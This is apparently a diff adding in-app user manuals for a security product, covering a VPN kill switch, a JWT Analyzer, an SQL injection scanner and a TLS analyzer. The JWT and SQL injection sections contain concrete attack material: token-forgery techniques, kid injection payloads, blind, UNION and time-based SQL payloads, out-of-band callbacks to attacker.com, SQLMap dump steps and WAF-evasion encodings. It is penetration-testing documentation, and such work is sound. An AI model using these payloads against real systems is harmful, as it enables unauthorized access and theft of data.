+  Priority 5:  Allow admin SSH (YOUR_IP:22)
+  Priority 10: Allow WireGuard (51820/UDP)
+  Priority 20: Allow established connections
+  Priority 50: Rate limit SSH (all IPs)
+  Priority 90: Block known attacker IPs
+  Priority 100: Default deny all (DROP policy)
+
+  If an ALLOW rule and a BLOCK rule conflict on the same IP+port,
+  whichever has the LOWER priority number wins.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "kill-switch-manual",
+    title: "Kill Switch + Auto-IP",
+    subtitle: "OS-level traffic blocking on VPN drop, IPv6 protection, and auto-IP whitelisting",
+    version: "1.4",
+    pages: 12,
+    icon: Lock,
+    iconColor: "text-amber-400",
+    tier: "basic",
+    content: `Kill Switch — User Manual
+Version 1.4 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+VPN Basic Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. What the Kill Switch Does
+2. Auto-IP Whitelisting
+3. IPv6 Leak Protection
+4. Platform Rules (Linux / macOS / Windows)
+5. Enabling the Kill Switch
+6. Disabling the Kill Switch
+7. Kill Switch Modes
+8. Testing the Kill Switch
+9. Troubleshooting
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. WHAT THE KILL SWITCH DOES
+
+  The Kill Switch blocks ALL internet traffic the instant your
+  VPN tunnel drops — preventing your real IP address from being
+  exposed even for a millisecond.
+
+  Without a kill switch:
+  • VPN drops (network hiccup, server restart, interface change)
+  • Your OS immediately falls back to direct internet connection
+  • All apps continue sending traffic with your real IP
+  • Your ISP, websites, and anyone monitoring see your real IP
+  • Duration: could be seconds to minutes before VPN reconnects
+
+  With ProxhqVPN Kill Switch active:
+  • VPN drops → OS firewall instantly blocks all non-VPN traffic
+  • Apps get no internet access (connection refused or timeout)
+  • Real IP never exposed — zero-gap protection
+  • VPN reconnects → firewall automatically re-allows VPN traffic
+
+  Implementation:
+  • Linux: iptables + ip6tables (kernel-level, near-instantaneous)
+  • macOS: pf (packet filter, built into all macOS versions)
+  • Windows: Windows Defender Firewall (netsh advfirewall)
+
+2. AUTO-IP WHITELISTING
+
+  ProxhqVPN Kill Switch includes Auto-IP Whitelisting — a feature
+  that prevents you from locking yourself out of your server when
+  the kill switch is applied on a remote machine.
+
+  How it works:
+  1. When you open the Kill Switch page, ProxhqVPN calls
+     /api/my-ip to detect your current public IP address.
+  2. A green "SAFE IP AUTO-DETECTED" banner shows your IP.
+  3. All generated rule scripts have this IP pre-baked in as
+     an exception — your IP can always reach the server.
+
+  If your IP changes (dynamic IP):
+  • Re-open the Kill Switch page — new IP is auto-detected.
+  • Regenerate rules using the new IP.
+  • Re-apply the updated rules to your server.
+
+3. IPV6 LEAK PROTECTION
+
+  Modern devices have BOTH an IPv4 address and an IPv6 address.
+  A VPN that only blocks IPv4 traffic leaves an IPv6 backdoor:
+  • Attacker (or tracker) pings your IPv6 address directly
+  • Your device responds with its real IPv6 address
+  • Real location exposed despite VPN being active
+
+  ProxhqVPN Kill Switch includes full IPv6 protection:
+  • ip6tables rules mirror all iptables rules
+  • IPv6 loopback allowed (::1)
+  • IPv6 VPN interface passthrough allowed
+  • ALL other IPv6 traffic: DROP policy
+
+  Linux IPv6 kill switch rules (included in generated script):
+    ip6tables -P INPUT DROP
+    ip6tables -P OUTPUT DROP
+    ip6tables -P FORWARD DROP
+    ip6tables -A INPUT -i lo -j ACCEPT
+    ip6tables -A OUTPUT -o lo -j ACCEPT
+    ip6tables -A INPUT -i wg0 -j ACCEPT
+    ip6tables -A OUTPUT -o wg0 -j ACCEPT
+
+4. PLATFORM RULES
+
+  LINUX (iptables):
+  Generated as a .sh bash script.
+
+  Key rules:
+  # Block all OUTPUT not on wg0 (except VPN server IP + your safe IP)
+  iptables -I OUTPUT ! -o wg0 -m mark \
+    ! --mark $(wg show wg0 fwmark) \
+    -m addrtype ! --dst-type LOCAL -j REJECT
+
+  # Allow your safe IP to bypass block (remote server admin)
+  iptables -I OUTPUT -s YOUR_SAFE_IP/32 -j ACCEPT
+
+  # Allow VPN server endpoint (so WireGuard handshake works)
+  iptables -I OUTPUT -d VPN_ENDPOINT_IP/32 -j ACCEPT
+
+  # Allow loopback + LAN
+  iptables -I OUTPUT -o lo -j ACCEPT
+  iptables -I OUTPUT -d 192.168.0.0/16 -j ACCEPT
+  iptables -I OUTPUT -d 10.0.0.0/8 -j ACCEPT
+
+  macOS (pf):
+  Generated as a pf.conf snippet.
+  Apply with: sudo pfctl -f /etc/pf.conf && sudo pfctl -e
+
+  Key rules:
+  # Block all traffic by default
+  block all
+  # Allow VPN interface
+  pass on utun0 all
+  # Allow loopback
+  pass on lo0 all
+  # Allow to VPN server (so reconnection works)
+  pass out proto udp from any to VPN_SERVER_IP port 51820
+  # Allow your admin IP
+  pass from YOUR_SAFE_IP to any
+
+  Windows (netsh):
+  Generated as a .bat script.
+  Run as Administrator.
+
+  Key rules:
+  netsh advfirewall firewall add rule name="BlockAll" ^
+    dir=out action=block
+  netsh advfirewall firewall add rule name="AllowWireGuard" ^
+    dir=out action=allow protocol=UDP remoteport=51820
+  netsh advfirewall firewall add rule name="AllowAdminIP" ^
+    dir=out action=allow remoteip=YOUR_SAFE_IP
+
+5. ENABLING THE KILL SWITCH
+
+  Method A — ProxhqVPN Dashboard (recommended):
+  1. Navigate to Kill Switch (/kill-switch).
+  2. Verify the green "SAFE IP AUTO-DETECTED" banner shows your
+     correct public IP. If wrong, refresh the page.
+  3. Select your platform: Linux / macOS / Windows.
+  4. Click "Download Rules" to save the generated script.
+  5. Run the script on your system (with appropriate privileges).
+  6. Click "Enable Kill Switch" in the dashboard.
+  7. Status changes to: ACTIVE (green).
+
+  Method B — Command line (Linux):
+  Download the script from the dashboard, then:
+  sudo bash proxhqvpn-killswitch-enable.sh
+
+  Verify kill switch is active:
+  sudo iptables -L OUTPUT -n --line-numbers | head -20
+  # You should see REJECT/DROP rules for non-wg0 traffic
+
+6. DISABLING THE KILL SWITCH
+
+  WARNING: Disable the kill switch only AFTER reconnecting your VPN.
+  Disabling while VPN is disconnected = real IP briefly exposed.
+
+  Method A — Dashboard:
+  Kill Switch → "Disable Kill Switch" → Confirm.
+  Rules are flushed. Status: INACTIVE.
+
+  Method B — Command line (Linux):
+  sudo bash proxhqvpn-killswitch-disable.sh
+  # Or manually: sudo iptables -F && sudo iptables -P OUTPUT ACCEPT
+
+  Method C — Emergency recovery (if locked out):
+  If you locked yourself out:
+  sudo iptables -F     # Flush all rules
+  sudo iptables -P INPUT ACCEPT
+  sudo iptables -P OUTPUT ACCEPT
+  sudo ip6tables -F
+  sudo ip6tables -P INPUT ACCEPT
+  sudo ip6tables -P OUTPUT ACCEPT
+
+7. KILL SWITCH MODES
+
+  STRICT Mode (default):
+    Blocks ALL traffic when VPN is down.
+    No internet access until VPN reconnects.
+    Zero IP exposure.
+
+  SOFT Mode:
+    Allows LAN traffic even when VPN is down.
+    DNS, file sharing, and local services still work.
+    Slight exposure risk: LAN devices can see your traffic.
+    Use when working from a trusted private network.
+
+  CUSTOM Mode:
+    Define specific bypass exceptions:
+    • Allow specific ports even without VPN (e.g. local 22/TCP)
+    • Allow specific IP ranges without VPN
+    • Set automatic disable after N minutes without VPN reconnect
+
+8. TESTING THE KILL SWITCH
+
+  Always test after enabling — never assume it works.
+
+  Test 1 — Disconnect VPN and check IP:
+  1. Enable kill switch.
+  2. Confirm VPN is connected (check dashboard).
+  3. Note your exit IP (visit https://api.ipify.org).
+  4. Disconnect VPN tunnel only (keep kill switch active).
+  5. Try to load any website. Should fail entirely.
+  6. Check your IP again — should show nothing / connection refused.
+  7. Reconnect VPN → internet returns.
+
+  Test 2 — IPv6 leak test:
+  1. Enable kill switch.
+  2. Navigate to /leaks → run IPv6 leak test.
+  3. Your IPv6 address should NOT appear in results.
+  4. If IPv6 leaks: confirm ip6tables rules were applied.
+     Run: sudo ip6tables -L OUTPUT -n | grep DROP
+
+  Test 3 — Network interface check:
+  Terminal → ip addr show
+  Confirm only lo, wg0, and LAN interface exist.
+  Any unexpected interface may bypass kill switch rules.
+
+9. TROUBLESHOOTING
+
+  "Internet works even with VPN disconnected":
+  → Kill switch rules may not have been applied.
+  → Re-download and re-run the script as root/Administrator.
+  → Verify: sudo iptables -L OUTPUT -n | grep REJECT
+
+  "Can't reach the VPN dashboard":
+  → Your safe IP may have changed (dynamic IP).
+  → Temporarily disable kill switch from local console.
+  → Regenerate rules with current IP.
+  → Re-apply and re-enable.
+
+  "IPv6 still leaking":
+  → ip6tables was not applied (not installed or not run).
+  → Install: sudo apt install iptables (includes ip6tables).
+  → Re-run the kill switch script as root.
+
+  "macOS pf not working after reboot":
+  → pf rules do not persist across reboots by default.
+  → Add to /etc/pf.conf or create a LaunchDaemon plist.
+  → Kill Switch → Settings → "Install Persistent pf Rules"
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "jwt-analyzer-manual",
+    title: "JWT Analyzer",
+    subtitle: "JWT decode, algorithm confusion, alg:none, jku/x5u injection, kid injection, claim escalation",
+    version: "1.3",
+    pages: 16,
+    icon: Lock,
+    iconColor: "text-yellow-400",
+    tier: "pro",
+    content: `JWT Analyzer — User Manual
+Version 1.3 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Command Center Pro Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+LEGAL NOTICE: Only test JWT tokens from applications you own
+or have explicit written permission to test.
+ALPHA UNLIMITED TECHNOLOGIES LLC assumes no liability for misuse.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. JWT Structure Overview
+2. Decode & Analyze
+3. Attack 1 — alg:none
+4. Attack 2 — Algorithm Confusion (RS256 → HS256)
+5. Attack 3 — jku Header Injection
+6. Attack 4 — x5u Header Injection
+7. Attack 5 — Embedded JWK Attack
+8. Attack 6 — kid SQL / Path Injection
+9. Attack 7 — Claim Escalation
+10. Workflow: Capture → Analyze → Attack → Replay
+11. How to Capture JWTs
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. JWT STRUCTURE OVERVIEW
+
+  A JWT (JSON Web Token) has three parts separated by dots:
+  HEADER.PAYLOAD.SIGNATURE
+
+  Header (base64url decoded):
+  {
+    "alg": "RS256",    ← algorithm (this is what we attack)
+    "typ": "JWT",
+    "kid": "key-id"   ← key identifier (also attackable)
+  }
+
+  Payload (base64url decoded — the claims):
+  {
+    "sub": "user123",
+    "role": "user",   ← privilege claim (escalation target)
+    "iat": 1712345678,
+    "exp": 1712432078
+  }
+
+  Signature: cryptographic proof that header+payload weren't
+  modified. The attacks here either bypass signature validation
+  or forge a valid signature using a different key.
+
+2. DECODE & ANALYZE
+
+  JWT Analyzer (/jwt-analyzer) → paste any JWT token.
+  Click "Decode & Analyze".
+
+  Analysis output:
+  • Algorithm: RS256, HS256, ES256, none, etc.
+  • Expiry: is the token expired? (check before testing)
+  • Subject / User ID
+  • All claims in human-readable format
+  • Weakness flags:
+      ⚠ Short HMAC secret (HS256 with secret < 16 chars)
+      ⚠ Algorithm 'none' accepted
+      ⚠ No expiry claim (no exp field)
+      ⚠ kid field present (potential injection)
+      ⚠ jku/x5u header present (potential JWKS injection)
+      ⚠ High-privilege claim (role: admin, isAdmin: true)
+
+3. ATTACK 1 — ALG:NONE
+
+  Vulnerability: some JWT libraries check the signature ONLY if
+  the algorithm is not "none". Changing alg to "none" and removing
+  the signature causes them to accept the unsigned token.
+
+  Attack:
+  1. Decode the header: {"alg": "RS256", "typ": "JWT"}
+  2. Modify: {"alg": "none", "typ": "JWT"}
+  3. Re-encode header as base64url (no padding).
+  4. Modify payload claims as desired (e.g. role → admin).
+  5. Re-encode payload as base64url.
+  6. Construct token: NEW_HEADER.NEW_PAYLOAD.
+     (trailing dot, no signature — or empty signature)
+
+  JWT Analyzer does this automatically:
+  Forgery Attacks → alg:none → Generate Attack Token
+
+  Detection: if the server returns 200 with modified claims
+  instead of 401/403, the server is vulnerable.
+
+4. ATTACK 2 — ALGORITHM CONFUSION (RS256 → HS256)
+
+  Vulnerability: the server uses RS256 (asymmetric — RSA private
+  key signs, public key verifies). If a library allows the client
+  to specify the algorithm, you can switch to HS256 (symmetric —
+  same key for signing and verification). Using the server's PUBLIC
+  KEY as the HS256 HMAC secret creates a valid signature that the
+  server will accept.
+
+  Attack:
+  1. Fetch the server's public key from its JWKS endpoint:
+     https://target.com/.well-known/jwks.json
+     (or check for /api/jwks, /oauth/jwks, /.well-known/openid-configuration)
+  2. Extract the RSA public key (n and e values or PEM format).
+  3. Change token header: "alg": "RS256" → "alg": "HS256"
+  4. Modify payload claims.
+  5. Sign with HS256 using the PUBLIC key as the HMAC secret.
+
+  JWT Analyzer does this automatically:
+  → Forgery Attacks → RS256→HS256 → enter JWKS endpoint URL
+  → Analyzer fetches the key and forges the token.
+
+5. ATTACK 3 — jku HEADER INJECTION
+
+  Vulnerability: the jku (JWK Set URL) header tells the server
+  where to fetch the signing key. If the server fetches any URL
+  in the jku header without validation, you can point it to your
+  own JWKS endpoint.
+
+  Attack:
+  1. Generate an RSA key pair (JWT Analyzer does this for you).
+  2. Host your public key as a JWKS JSON at a URL you control
+     (use the OAST Tester callback URL).
+  3. Add to JWT header: "jku": "https://your-oast-server/jwks.json"
+  4. Sign the token with YOUR private key.
+  5. The server fetches YOUR JWKS and validates with your key.
+     → You control the signing key → forge any claims.
+
+  JWT Analyzer → Forgery Attacks → jku Injection:
+  → Enter your JWKS URL (OAST Tester provides one automatically)
+  → Generates the key pair, hosts it, and forges the token.
+
+6. ATTACK 4 — x5u HEADER INJECTION
+
+  Same concept as jku but uses x5u (X.509 certificate chain URL).
+  The server fetches an X.509 certificate chain from the x5u URL
+  and uses the public key from the certificate to verify the token.
+
+  JWT Analyzer → Forgery Attacks → x5u Injection:
+  → Generates a self-signed certificate, hosts it at OAST URL.
+  → Forges token signed with the corresponding private key.
+
+7. ATTACK 5 — EMBEDDED JWK ATTACK
+
+  Vulnerability: the jwk header embeds the signing key directly
+  in the JWT. Vulnerable servers use this embedded key to verify
+  the signature — meaning you can sign with your own key.
+
+  Attack:
+  1. Generate RSA key pair.
+  2. Add header: "jwk": { [your public JWK here] }
+  3. Sign with your private key.
+  4. Server reads "jwk" from header, uses it to verify → passes.
+
+  JWT Analyzer → Forgery Attacks → Embedded JWK
+
+8. ATTACK 6 — kid SQL / PATH INJECTION
+
+  Vulnerability: the kid (Key ID) header value is used by some
+  servers to look up the signing key in a database or file system.
+  If unsanitized, SQL injection or path traversal in kid can
+  control what "key" the server uses.
+
+  Payloads (all 6 tested automatically):
+
+  SQL Injection:
+    kid: "x' UNION SELECT 'mysecret'-- -"
+    → If SQL injection works, server fetches "mysecret" as key
+    → Sign with HS256 using "mysecret" as the secret
+
+  OR bypass:
+    kid: "x' OR '1'='1"
+    → May return first key in DB regardless of ID
+
+  Path traversal:
+    kid: "../../dev/null"
+    → /dev/null = empty key → sign with empty HS256 secret
+
+  NULL byte:
+    kid: "valid-key\x00injected"
+    → Null byte may truncate DB query or file lookup
+
+  JWT Analyzer → Forgery Attacks → kid Injection:
+  → Tests all 6 payloads
+  → For SQL injection variants: you provide the HMAC secret
+    value injected via UNION SELECT
+  → For /dev/null variant: signs with empty string as secret
+
+9. ATTACK 7 — CLAIM ESCALATION
+
+  Not a signature attack — this tests whether the server validates
+  privilege claims SERVER-SIDE or trusts the JWT payload directly.
+
+  Claims to escalate (all modified in one shot):
+    role: "user" → "admin"
+    isAdmin: false → true
+    scope: "read" → "admin read:all write:all"
+    plan: "free" → "enterprise"
+    group: "users" → "administrators"
+
+  Attack:
+  1. Take a valid token (signed correctly).
+  2. Modify any privilege claim in the payload.
+  3. Leave signature unchanged (will be invalid — that's the test).
+  4. Submit the modified token.
+  5. If the server returns 200 with elevated access:
+     → Server is not verifying the signature! Critical bug.
+
+  JWT Analyzer → Forgery Attacks → Claim Escalation.
+
+10. WORKFLOW: CAPTURE → ANALYZE → ATTACK → REPLAY
+
+  Step 1: Capture the JWT
+    See Section 11 for how to capture JWTs.
+
+  Step 2: Decode & Analyze
+    Paste the JWT → Decode & Analyze.
+    Review the weakness flags to choose which attack to try.
+
+  Step 3: Select Attack
+    Choose from the Forgery Attacks panel based on flags:
+    • jku/x5u present → try jku or x5u injection first
+    • kid present → try kid SQL/path injection
+    • RS256 algorithm → try algorithm confusion
+    • Any algorithm → try alg:none as baseline
+    • High privilege claim visible → try claim escalation
+
+  Step 4: Generate Attack Token
+    Click "Generate Attack Token" for the selected attack.
+    Token is displayed and auto-copied.
+
+  Step 5: Replay
+    Method A: HTTP Interceptor → intercept a request → replace
+              Authorization: Bearer [original] with forged token.
+    Method B: curl:
+              curl -H "Authorization: Bearer FORGED_TOKEN" \
+                   https://target.com/api/admin/users
+
+  Step 6: Assess Result
+    200 + admin data → critical vulnerability confirmed
+    401/403 → token rejected (server validating correctly)
+    500 → server error (token caused exception — investigate)
+
+11. HOW TO CAPTURE JWTS
+
+  From Browser DevTools:
+    F12 → Network tab → filter by XHR/Fetch
+    Click any API request → Headers → Authorization: Bearer [JWT]
+    Or: Application tab → Local Storage / Session Storage → look
+    for keys like "token", "jwt", "auth_token", "access_token"
+
+  From HTTP Interceptor:
+    Browse the target with Interceptor ON.
+    Any request with Authorization: Bearer header shows
+    an "Analyze JWT" button → one click to JWT Analyzer.
+
+  From curl:
+    curl -c cookies.txt -b cookies.txt -v https://target.com/login \
+      --data '{"user":"test","pass":"test"}' 2>&1 | grep -i bearer
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "sqli-scanner-manual",
+    title: "SQL Injection Scanner",
+    subtitle: "Error-based, blind boolean, time-based, UNION, second-order, and OOB detection",
+    version: "1.2",
+    pages: 14,
+    icon: Database,
+    iconColor: "text-orange-400",
+    tier: "pro",
+    content: `SQL Injection Scanner — User Manual
+Version 1.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Command Center Pro Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+LEGAL NOTICE: Only test systems you own or have explicit
+written permission to test.
+ALPHA UNLIMITED TECHNOLOGIES LLC assumes no liability for misuse.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview
+2. Detection Techniques
+3. Configuring a Scan
+4. Reading Results
+5. Sending to SQLMap
+6. Database-Specific Notes
+7. Second-Order SQLi
+8. Out-of-Band (OOB) SQLi
+9. WAF Evasion Mode
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW
+
+  The SQL Injection Scanner (/sqli-scanner) detects SQL injection
+  vulnerabilities across web application endpoints. It uses 5
+  detection techniques and supports all major database engines.
+
+  Workflow: Scanner detects → SQLMap exploits → extract data
+  The Scanner is designed to quickly confirm whether SQLi exists.
+  Once confirmed, send to SQLMap for full exploitation.
+
+2. DETECTION TECHNIQUES
+
+  ERROR-BASED:
+    Injects payloads that cause the database to emit error messages
+    containing internal information.
+
+    Example payloads:
+      '                     → generic syntax error
+      ''                    → quote escaping test
+      \` (backtick)         → MySQL-specific syntax
+      1 AND EXTRACTVALUE(1,CONCAT(0x5c,VERSION()))--
+      1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+    Detection: response body contains database error strings:
+    MySQL:   "You have an error in your SQL syntax"
+    MSSQL:   "Unclosed quotation mark"
+    Oracle:  "ORA-01756" or "quoted string not properly terminated"
+    PgSQL:   "unterminated quoted string" or "syntax error at"
+    SQLite:  "unrecognized token"
+
+  BOOLEAN BLIND:
+    Sends two requests: one with a TRUE condition, one with FALSE.
+    Compares response body size, status code, or content to detect
+    behavioral differences.
+
+    Example payload pairs:
+    TRUE:   ?id=1 AND 1=1
+    FALSE:  ?id=1 AND 1=2
+
+    TRUE:   ?id=1' AND '1'='1
+    FALSE:  ?id=1' AND '1'='2
+
+    If response to TRUE differs from FALSE: SQLi confirmed.
+    Response differences measured: body length, status code,
+    specific keyword presence/absence, response time.
+
+  TIME-BASED BLIND:
+    Injects payloads that cause the database to sleep for a fixed
+    period. If the response takes longer than expected: SQLi.
+
+    Payloads by DBMS:
+    MySQL:   ?id=1' AND SLEEP(5)-- -
+    MSSQL:   ?id=1'; WAITFOR DELAY '0:0:5'--
+    Oracle:  ?id=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+    PgSQL:   ?id=1'; SELECT pg_sleep(5)--
+    SQLite:  ?id=1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--
+
+    Threshold: response time > 4.5 seconds = VULNERABLE.
+    Noise protection: baseline response time measured first;
+    injection delay must exceed baseline by 4+ seconds.
+
+  UNION-BASED:
+    Determines column count via ORDER BY, then injects UNION SELECT
+    to extract data directly in the response.
+
+    Step 1 — Find column count:
+    ?id=1 ORDER BY 1--
+    ?id=1 ORDER BY 2--
+    ... (increase until error = column count-1)
+
+    Step 2 — Find displayable columns:
+    ?id=-1 UNION SELECT NULL,NULL,NULL--
+    ?id=-1 UNION SELECT 'a','b','c'--
+
+    Step 3 — Extract data:
+    ?id=-1 UNION SELECT version(),user(),database()--
+
+  SECOND-ORDER:
+    Stores a payload in one endpoint, triggers it in another.
+    Harder to detect — requires two requests in sequence.
+
+    Example:
+    POST /register username=admin'--
+    GET  /profile?user=admin'-- (triggers stored payload)
+
+    Scanner tests this by injecting in write endpoints
+    (register, update, comment) then checking read endpoints.
+
+3. CONFIGURING A SCAN
+
+  SQLi Scanner (/sqli-scanner) → configuration:
+
+  Target URL:
+    Full URL including any existing query parameters.
+    Mark injection point with an asterisk (*):
+      https://target.com/api/search?q=*&page=1
+    Or leave the parameter value and let auto-detection find it.
+
+  HTTP Method: GET / POST / PUT / DELETE
+
+  Headers (optional):
+    Add any authentication headers:
+      Authorization: Bearer eyJ...
+      Cookie: session=abc123
+      X-API-Key: your-api-key
+
+  Request Body (POST/PUT):
+    JSON: {"search": "*", "page": 1}    ← * marks injection point
+    Form: search=*&page=1
+
+  Injection Techniques (select all by default):
+    ☑ Error-based
+    ☑ Boolean blind
+    ☑ Time-based blind
+    ☑ UNION-based
+    ☑ Second-order (experimental)
+
+  DBMS (optional — auto-detected if left blank):
+    MySQL, MSSQL, PostgreSQL, Oracle, SQLite, MariaDB
+
+  Threads: 1–10 (default 3 — parallel parameter testing)
+
+  Delay: 0–5 seconds between requests (for rate-limited targets)
+
+4. READING RESULTS
+
+  Each confirmed injection shows:
+  • Technique: which detection method confirmed it
+  • Parameter: the vulnerable parameter name
+  • Payload: the exact payload that confirmed injection
+  • Evidence: the response excerpt that proved vulnerability
+  • DBMS: detected database engine
+  • CVSS score: severity rating
+
+  Evidence column contents:
+  Error-based:   extracted error message string from response
+  Boolean blind: "Response length diff: 847 vs 203 bytes"
+  Time-based:    "Response time: 5.23s (baseline: 0.12s)"
+  Union-based:   "MySQL 8.0.28, root@localhost, targetdb"
+
+5. SENDING TO SQLMAP
+
+  Once a vulnerability is confirmed, escalate to SQLMap for full
+  automated exploitation: dump databases, tables, users, passwords.
+
+  Click "Send to SQLMap" on any confirmed finding.
+  SQLMap tab opens with:
+  • URL pre-filled
+  • Technique flag set (--technique=E for error-based, etc.)
+  • DBMS flag set (--dbms=mysql)
+  • Parameter marked (--data or -p flag set)
+
+  Then in SQLMap:
+  • Click "Dump Databases" (--dbs)
+  • Select a database → "Dump Tables" (-D dbname --tables)
+  • Select a table → "Dump Data" (-D dbname -T tablename --dump)
+
+6. DATABASE-SPECIFIC NOTES
+
+  MySQL / MariaDB:
+    • information_schema holds all table/column names
+    • group_concat() useful for extracting multiple values
+    • FILE privilege allows reading server files via LOAD_FILE()
+    • INTO OUTFILE allows writing files (web shell if path known)
+
+  MSSQL:
+    • xp_cmdshell can execute OS commands (if enabled)
+    • OPENROWSET for OOB data exfiltration
+    • information_schema.tables or sys.tables for enumeration
+
+  PostgreSQL:
+    • pg_read_file() for file reading (superuser only)
+    • COPY TO/FROM for file I/O
+    • pg_sleep() for time-based
+
+  Oracle:
+    • all_tables, all_columns for enumeration
+    • UTL_HTTP for OOB HTTP callback
+    • DBMS_LDAP for OOB DNS lookup
+
+  SQLite:
+    • sqlite_master for schema enumeration
+    • Very limited OOB capability
+    • Time-based: HEX(RANDOMBLOB(N)) for delay
+
+7. SECOND-ORDER SQLI
+
+  Configure second-order scan:
+  Write Endpoint:  URL where payload is stored (POST /register)
+  Read Endpoint:   URL where payload is executed (GET /profile)
+  Trigger Field:   field name in the read response that reflects stored data
+  Write Body:      {"username": "INJECT_HERE", "email": "test@test.com"}
+
+  The scanner injects in the write endpoint and polls the read
+  endpoint for the SQLi confirmation signals (error, diff, delay).
+
+8. OUT-OF-BAND (OOB) SQLI
+
+  For blind SQLi with no response differences (both error and
+  time-based fail), try OOB via the OAST Tester:
+
+  1. Get your OAST callback URL: /oast-tester → copy DNS/HTTP URL
+  2. In SQLi Scanner → Advanced → OOB Mode → paste callback URL
+  3. Scanner injects DNS/HTTP callback payloads:
+     MySQL:  LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\x'))
+     MSSQL:  EXEC master.dbo.xp_dirtree 'YOUR_OAST_URL'
+     Oracle: SELECT UTL_HTTP.REQUEST('http://YOUR_OAST_URL')
+  4. Check OAST Tester for incoming DNS/HTTP hits confirming SQLi.
+
+9. WAF EVASION MODE
+
+  Scanner → Advanced → WAF Evasion: ON
+
+  Applies automatic obfuscation to all payloads:
+  • Inline comments: SELECT/**/version()
+  • Case variation: SeLeCt VeRsIoN()
+  • URL encoding: %53%45%4C%45%43%54
+  • Whitespace alternatives: tab, newline, CR
+  • MySQL version comments: SELECT /*!50000 version*/()
+  • Double URL encoding: %2553%2545%254C%2545%2543%2554
+
+  Also pairs with Ghost Chain WAF Bypass payloads for maximum
+  evasion coverage against Cloudflare, AWS WAF, ModSecurity.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "ssl-tls-manual",
+    title: "SSL/TLS Analyzer",
+    subtitle: "Certificate inspection, protocol versions, cipher suites, and known vuln detection",
+    version: "1.1",
+    pages: 12,
+    icon: Lock,
+    iconColor: "text-blue-300",
+    tier: "pro",
+    content: `SSL/TLS Analyzer — User Manual
+Version 1.1 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Command Center Pro Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview
+2. Certificate Inspection
+3. Protocol Version Testing
+4. Cipher Suite Analysis
+5. Key Exchange & Forward Secrecy
+6. HTTP Security Header Check
+7. Known Vulnerability Detection
+8. How to Use
+9. Reading the Report
+10. Remediation Reference
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW
+
+  The SSL/TLS Analyzer (/ssl-tls) performs a live TLS handshake
+  analysis against any HTTPS endpoint. It tests the server's TLS
+  configuration for weak protocols, insecure cipher suites, expired
+  or misconfigured certificates, and known vulnerabilities.
+
+  All scans run from the ProxhqVPN server (through your VPN tunnel).
+  Useful for: bug bounty recon, security audit, compliance checking
+  (PCI DSS, HIPAA, SOC 2 all require strong TLS configurations).
+
+2. CERTIFICATE INSPECTION
+
+  Checks:
+  • Subject: CN, O, OU, C fields
+  • SANs (Subject Alternative Names): all covered domains
+  • Issuer: CA name (DigiCert, Let's Encrypt, Sectigo, etc.)
+  • Validity: not-before and not-after dates
+  • Expiry warning: flags certs expiring within 30 days
+  • Key type: RSA / ECDSA / EdDSA
+  • Key size: RSA <2048 = weak, RSA >=4096 = strong
+  • Signature algorithm: SHA-256 / SHA-1 (SHA-1 = insecure)
+  • Certificate Transparency: is it logged in CT logs?
+  • OCSP stapling: is it configured?
+  • Certificate chain: complete chain to root CA present?
+
+  Common certificate findings:
+  CRITICAL: Certificate expired (past not-after date)
+  HIGH:     Certificate expiring in < 7 days
+  HIGH:     SHA-1 signature algorithm (breakable)
+  HIGH:     Self-signed certificate (no CA trust)
+  MEDIUM:   Certificate expiring in 8–30 days
+  MEDIUM:   RSA key < 2048 bits
+  LOW:      No OCSP stapling configured
+
+3. PROTOCOL VERSION TESTING
+
+  The analyzer probes the server with each TLS/SSL version:
+
+  SSLv2 (1995) — CRITICAL if accepted
+    Fundamentally broken. Allows DROWN attack.
+    Any server still accepting SSLv2 is severely outdated.
+
+  SSLv3 (1996) — CRITICAL if accepted
+    Broken by POODLE attack (2014). Never acceptable.
+
+  TLS 1.0 (1999) — HIGH if accepted
+    Deprecated by RFC 8996 (2021). Vulnerable to BEAST, POODLE-TLS.
+    PCI DSS requires disabling TLS 1.0 since June 2018.
+
+  TLS 1.1 (2006) — MEDIUM if accepted
+    Deprecated. No known practical attacks but obsolete.
+    Should be disabled in all modern deployments.
+
